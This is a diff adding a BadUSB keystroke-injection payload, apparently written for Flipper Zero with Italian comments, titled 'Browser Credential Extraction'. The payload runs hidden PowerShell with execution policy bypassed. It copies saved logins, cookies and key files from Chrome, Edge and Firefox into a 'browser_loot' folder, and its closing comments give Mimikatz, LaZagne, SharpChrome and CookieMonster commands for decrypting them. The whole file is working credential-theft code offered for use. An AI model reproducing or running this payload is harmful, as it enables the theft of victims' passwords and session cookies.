@@ -1,0 +1,37 @@
+REM ============================================================
+REM Title:    Browser Credential Extraction
+REM Target:   Windows 10/11
+REM Author:   FlipperZero-guide
+REM Category: Credential Harvest
+REM Privs:    User (no admin)
+REM Layout:   IT
+REM Time:     ~10 secondi
+REM Detect:   Alto - accesso a file del browser
+REM Desc:     Copia i database delle credenziali di Chrome,
+REM           Edge e Firefox per cracking offline.
+REM           I file vengono copiati in %TEMP%\browser_loot
+REM NOTE:     I database sono cifrati con DPAPI. Per decifrare
+REM           serve: mimikatz o dpapi.py (impacket) o LaZagne
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass -c "$d=\"$env:TEMP\browser_loot\";New-Item -ItemType Directory -Force -Path $d|Out-Null;$chrome=\"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\";if(Test-Path \"$chrome\Login Data\"){Copy-Item \"$chrome\Login Data\" \"$d\chrome_logins\";Copy-Item \"$chrome\Cookies\" \"$d\chrome_cookies\" -ErrorAction SilentlyContinue;Copy-Item \"$env:LOCALAPPDATA\Google\Chrome\User Data\Local State\" \"$d\chrome_localstate\" -ErrorAction SilentlyContinue};$edge=\"$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\";if(Test-Path \"$edge\Login Data\"){Copy-Item \"$edge\Login Data\" \"$d\edge_logins\"};$ff=Get-ChildItem \"$env:APPDATA\Mozilla\Firefox\Profiles\" -ErrorAction SilentlyContinue|Select-Object -First 1;if($ff){Copy-Item \"$($ff.FullName)\logins.json\" \"$d\ff_logins.json\" -ErrorAction SilentlyContinue;Copy-Item \"$($ff.FullName)\key4.db\" \"$d\ff_key4.db\" -ErrorAction SilentlyContinue};'Loot saved to '+$d|Out-File \"$d\README.txt\""
+ENTER
+
+REM ============================================================
+REM Post-exploitation: per decifrare i database
+REM
+REM Opzione 1 - LaZagne (Python):
+REM   lazagne.exe all
+REM
+REM Opzione 2 - SharpChrome (C#):
+REM   SharpChrome.exe logins
+REM
+REM Opzione 3 - Mimikatz:
+REM   dpapi::chrome /in:"chrome_logins" /unprotect
+REM
+REM Opzione 4 - CookieMonster (per cookie):
+REM   python3 cookiemonster.py -f chrome_cookies
+REM ============================================================
